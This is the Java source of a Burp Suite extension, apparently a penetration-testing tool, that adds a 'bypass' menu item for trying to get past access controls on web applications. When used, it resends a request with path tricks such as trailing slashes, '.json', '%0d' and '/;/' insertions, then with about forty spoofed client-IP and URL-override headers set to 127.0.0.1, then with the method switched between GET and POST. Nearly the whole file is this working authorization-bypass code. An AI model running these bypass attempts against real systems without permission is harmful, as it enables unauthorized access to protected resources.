/*
 * Copyright (c) 2023. PortSwigger Ltd. All rights reserved.
 *
 * This code may be used to extend the functionality of Burp Suite Community Edition
 * and Burp Suite Professional, provided that this usage does not violate the
 * license terms for those products.
 */

package com.authbypass;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.core.ToolType;
import burp.api.montoya.http.message.HttpHeader;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.ui.contextmenu.ContextMenuEvent;
import burp.api.montoya.ui.contextmenu.ContextMenuItemsProvider;

import javax.swing.*;
import java.awt.*;
import java.util.ArrayList;
import java.util.List;

public class MyContextMenuItemsProvider implements ContextMenuItemsProvider {

    private final MontoyaApi api;

    public MyContextMenuItemsProvider(MontoyaApi api) {
        this.api = api;
    }

    @Override
    public List<Component> provideMenuItems(ContextMenuEvent event) {
        if (event.isFromTool(ToolType.PROXY, ToolType.TARGET, ToolType.LOGGER, ToolType.REPEATER)) {
            List<Component> menuItemList = new ArrayList<>();

            JMenuItem retrieveRequestItem = new JMenuItem("bypass");

            HttpRequestResponse requestResponse = event.messageEditorRequestResponse().isPresent()
                    ? event.messageEditorRequestResponse().get().requestResponse()
                    : event.selectedRequestResponses().get(0);

            retrieveRequestItem.addActionListener(l -> requestlist(generatePathVariations(requestResponse.request().path().toString()),requestResponse)
                    );
            menuItemList.add(retrieveRequestItem);

            return menuItemList;
        }

        return null;
    }
    
    public void requestlist(List<String> paths, HttpRequestResponse requestResponse) {
        // 明确指定 SwingWorker 的类型
        SwingWorker<Void, String> worker = new SwingWorker<Void, String>() {
            @Override
            protected Void doInBackground() {
                for (String path : paths) {
                    api.http().sendRequest(requestResponse.request().withPath(path));
                    publish(path);  // 如果需要更新 UI，可以使用 publish
                }

                api.http().sendRequest(requestResponse.request().withHeader(HttpHeader.httpHeader("Base-Url","127.0.0.1")).withHeader(HttpHeader.httpHeader("Base-Url","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("Client-IP","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("Http-Url","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("Proxy-Host","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("Proxy-Url","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("Real-Ip","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("Redirect","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("Referer","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("Referrer","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("Refferer","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("Request-Uri","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("Uri","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("Url","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Client-IP","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Custom-IP-Authorization","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Forward-For","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Forwarded-By","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Forwarded-For-Original","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Forwarded-For","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Forwarded-Host","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Forwarded-Port","443"))
                .withHeader(HttpHeader.httpHeader("X-Forwarded-Port","4443"))
                .withHeader(HttpHeader.httpHeader("X-Forwarded-Port","80"))
                .withHeader(HttpHeader.httpHeader("X-Forwarded-Port","8080"))
                .withHeader(HttpHeader.httpHeader("X-Forwarded-Port","8443"))
                .withHeader(HttpHeader.httpHeader("X-Forwarded-Scheme","http"))
                .withHeader(HttpHeader.httpHeader("X-Forwarded-Scheme","https"))
                .withHeader(HttpHeader.httpHeader("X-Forwarded-Server","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Forwarded","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Forwarder-For","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Host","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Http-Destinationurl","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Http-Host-Override","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Original-Remote-Addr","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Original-Url","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Originating-IP","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Proxy-Url","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Real-Ip","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Remote-Addr","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Remote-IP","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-Rewrite-Url","127.0.0.1"))
                .withHeader(HttpHeader.httpHeader("X-True-IP","127.0.0.1")));

                if(!requestResponse.request().method().toString().equals("GET")){
                    api.http().sendRequest(requestResponse.request().withMethod("GET"));
                }
                if(!requestResponse.request().method().toString().equals("POST")){
                    api.http().sendRequest(requestResponse.request().withMethod("POST"));
                }
                return null;
            }

            @Override
            protected void process(List<String> chunks) {
                // 这里可以更新 UI，比如显示已处理的路径
                for (String path : chunks) {
                    // 处理 UI 更新
                }
            }

            @Override
            protected void done() {
                try {
                    get(); // 检查是否有异常
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        };

        worker.execute(); // 启动 SwingWorker
    }


    public static List<String> generatePathVariations(String path) {
        List<String> variations = new ArrayList<>();

        // 1. 最后一个目录加上 /
        String withTrailingSlash = path.replaceAll("([^/?]+)(\\?.*)?$", "$1/$2");
        variations.add(withTrailingSlash);

        // 2. 最后一个目录加上 .json
        String withJson = path.replaceAll("([^/?]+)(\\?.*)?$", "$1.json$2");
        variations.add(withJson);

        // 3. 最后一个目录加上 .111
        String with111 = path.replaceAll("([^/?]+)(\\?.*)?$", "$1.111$2");
        variations.add(with111);

        if (!path.contains("?")) {
            String withId = path + "?id=1";
            variations.add(withId);
        }

        // 5. 最后一个目录加上 /%0d
        String withCR = path.replaceAll("([^/?]+)(\\?.*)?$", "$1%0d$2");
        variations.add(withCR);

        // 7. 一个一个 / 变为 /;/
        for (int i = 0; i < path.length(); i++) {
            if (path.charAt(i) == '/') {
                String modifiedPath = path.substring(0, i) + "/;" + path.substring(i);
                variations.add(modifiedPath);
            }
        }

        return variations;
    }
}
